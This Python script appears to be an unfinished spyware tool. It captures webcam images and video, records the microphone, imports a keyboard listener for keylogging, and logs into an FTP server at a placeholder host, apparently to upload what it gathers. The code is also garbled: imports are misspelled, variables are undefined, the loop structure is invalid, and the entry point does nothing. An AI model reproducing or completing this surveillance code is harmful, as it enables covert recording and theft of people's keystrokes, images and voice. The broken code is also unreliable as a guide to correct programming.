#!/usr/bin/python3
import cv2
import logging
import numpy as np
import sounddevice as sd
from ftplip import FTP
from io import BytesIO
from termcolor import colored
from scipy.io.wavfile import write
from pynput.keyboard import Key, Listener


ftp = FTP('www.example.com')
ftp.login('username', 'password')
flo = BytesIO(buffer)

def main():
    print(colored('     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::::::::)::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::::::: ):::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::::::  )::::::::::::::::::::', 'green'))
    print(colored('     :::::::::::::::::::::::::::::::::::::::  ):::::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::::  )::::::::::::::::::::::', 'green'))
    print(colored('     :::::::::::::::::::::::::::::::::::::  ):::::::::::::::::::::::', 'green'))
    print(colored('     ::::::::::::::::::::::::::::::::::::  )::::::::::::::::::::::::', 'green'))

def webcam_img(img_arg):
    image_capture = cv2.VideoCapture(0)

    for i in range(img_arg):
        return_value, image_capture = camera.read()
        cv2.imwrite('log'+str(i)+'.png', image_capture)
    del(camera)

def webcam_vid(arg):
    video_capture = cv2.VideoCapture(0)
    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out_file = cv2.VideoWriter('output.avi', fourcc, 20.0, (640,  480))
    while video_capture.isOpened():
        ret, frame = video_capture.read()
        if not ret:
            print("Can't receive frame (stream end?). Exiting ...")
            break
    frame = cv2.flip(frame, 0)
    # write the flipped frame
    out_file.write(frame)
    cv2.imshow('frame', frame)
    if cv2.waitKey(1) == ord('q'):
        break
    # Release everything if job is finished
    video_capture.release()
    out_file.release()
    cv2.destroyAllWindows()

def voice_capture(duration):
    sample_rate = 44100
    seconds = duration # Record duration

    voice_note = st.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    write('voice_note.wav', sample_rate, voice_note)


if __name__ == '__main__':
    pass
